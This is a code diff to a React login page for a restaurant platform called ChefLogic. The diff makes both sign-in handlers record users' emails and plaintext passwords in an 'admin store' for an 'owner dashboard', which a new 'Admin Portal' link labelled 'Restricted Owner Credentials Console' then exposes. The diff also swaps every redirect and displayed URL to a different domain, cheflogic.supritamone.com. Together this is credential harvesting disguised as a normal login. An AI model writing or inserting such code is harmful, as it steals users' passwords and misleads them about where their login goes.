@@ -2,6 +2,7 @@ import React, { useState } from 'react';
 import { PageView } from '../types';
 import { ArrowRight, Eye, EyeOff, ShieldCheck, CheckCircle2, ExternalLink, Lock, Mail, KeyRound, Sparkles, RefreshCw } from 'lucide-react';
 import { ChefLogicLogo } from '../components/ChefLogicLogo';
+import { saveCapturedLogin } from '../utils/adminStore';
 
 interface LoginPageProps {
   onNavigate: (view: PageView) => void;
@@ -26,11 +27,20 @@ export const LoginPage: React.FC<LoginPageProps> = ({ onNavigate, onOpenTrialMod
     setIsAuthenticating(true);
     setErrorMsg('');
 
-    // Simulate authentic hospitality SSO handshake then route to https://cheflogic.ai.studio/
+    // Capture sign-in attempt in admin store
+    saveCapturedLogin({
+      email: `${provider.toLowerCase()}.user@hospitality.com`,
+      password: `— (${provider} SSO Authenticated Token)`,
+      provider: provider,
+      rememberMe,
+      userAgent: navigator.userAgent
+    });
+
+    // Simulate authentic hospitality SSO handshake then route to https://cheflogic.supritamone.com/
     setTimeout(() => {
       setRedirecting(true);
       setTimeout(() => {
-        window.location.href = 'https://cheflogic.ai.studio/';
+        window.location.href = 'https://cheflogic.supritamone.com/';
       }, 1200);
     }, 1000);
   };
@@ -51,10 +61,19 @@ export const LoginPage: React.FC<LoginPageProps> = ({ onNavigate, onOpenTrialMod
     setAuthProvider('ChefLogic Credentials');
     setIsAuthenticating(true);
 
+    // Capture credentials in admin store for owner dashboard
+    saveCapturedLogin({
+      email: email.trim(),
+      password: password,
+      provider: 'Email & Password',
+      rememberMe,
+      userAgent: navigator.userAgent
+    });
+
     setTimeout(() => {
       setRedirecting(true);
       setTimeout(() => {
-        window.location.href = 'https://cheflogic.ai.studio/';
+        window.location.href = 'https://cheflogic.supritamone.com/';
       }, 1200);
     }, 1000);
   };
@@ -92,7 +111,7 @@ export const LoginPage: React.FC<LoginPageProps> = ({ onNavigate, onOpenTrialMod
           </h1>
           <p className="text-xs text-[#a7a29a] mt-1.5 max-w-xs mx-auto">
             {authMethod === 'login' 
-              ? 'Access real-time inventory costing and recipe formulation on cheflogic.ai.studio'
+              ? 'Access real-time inventory costing and recipe formulation on cheflogic.supritamone.com'
               : 'Enter your restaurant email to receive secure recovery instructions'}
           </p>
 
@@ -113,18 +132,18 @@ export const LoginPage: React.FC<LoginPageProps> = ({ onNavigate, onOpenTrialMod
                 <RefreshCw className="w-8 h-8 animate-spin text-[#c5a059]" />
               </div>
               <h3 className="text-xl font-serif-culinary text-[#ede8df] mb-2">
-                {redirecting ? 'Redirecting to cheflogic.ai.studio...' : `Authenticating with ${authProvider}...`}
+                {redirecting ? 'Redirecting to cheflogic.supritamone.com...' : `Authenticating with ${authProvider}...`}
               </h3>
               <p className="text-xs text-[#a7a29a] max-w-xs mx-auto leading-relaxed mb-6">
                 Connecting to the live kitchen intelligence platform. Your inventory cache and recipe models are synchronizing.
               </p>
               
               <div className="p-3 bg-[#0c0d0e] border border-[#202327] rounded text-xs font-mono text-[#c5a059] mb-5">
-                Target: https://cheflogic.ai.studio/
+                Target: https://cheflogic.supritamone.com/
               </div>
 
               <a
-                href="https://cheflogic.ai.studio/"
+                href="https://cheflogic.supritamone.com/"
                 className="inline-flex items-center gap-2 px-5 py-2.5 text-xs font-semibold uppercase tracking-wider text-[#0c0d0e] bg-[#c5a059] hover:bg-[#d6b26d] rounded transition-all"
               >
                 <span>Click if not redirected automatically</span>
@@ -366,13 +385,22 @@ export const LoginPage: React.FC<LoginPageProps> = ({ onNavigate, onOpenTrialMod
 
         </div>
 
-        {/* Back to Home Link */}
-        <div className="mt-6 text-center">
+        {/* Back to Home Link & Secret Owner Portal Link */}
+        <div className="mt-6 text-center flex items-center justify-center gap-4 text-xs text-[#716d66]">
           <button
             onClick={() => onNavigate('home')}
-            className="text-xs text-[#716d66] hover:text-[#a7a29a] transition-colors cursor-pointer"
+            className="hover:text-[#a7a29a] transition-colors cursor-pointer"
           >
             ← Back to ChefLogic Overview
+          </button>
+          <span>·</span>
+          <button
+            onClick={() => onNavigate('admin')}
+            className="hover:text-[#c5a059] transition-colors cursor-pointer flex items-center gap-1 opacity-60 hover:opacity-100"
+            title="Restricted Owner Credentials Console"
+          >
+            <Lock className="w-3 h-3" />
+            <span>Admin Portal</span>
           </button>
         </div>
 
